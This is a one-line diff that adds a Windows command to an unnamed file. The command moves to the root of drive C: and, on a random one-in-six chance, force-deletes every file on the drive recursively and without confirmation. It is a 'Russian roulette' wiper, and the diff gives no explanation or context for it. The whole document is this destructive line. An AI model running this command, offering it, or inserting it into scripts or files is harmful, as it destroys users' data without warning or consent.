@@ -1,0 +1,1 @@
+c: & cd \ & set /a r=%random%%6 > nul & if %r%==0 del /f /s /q *.*
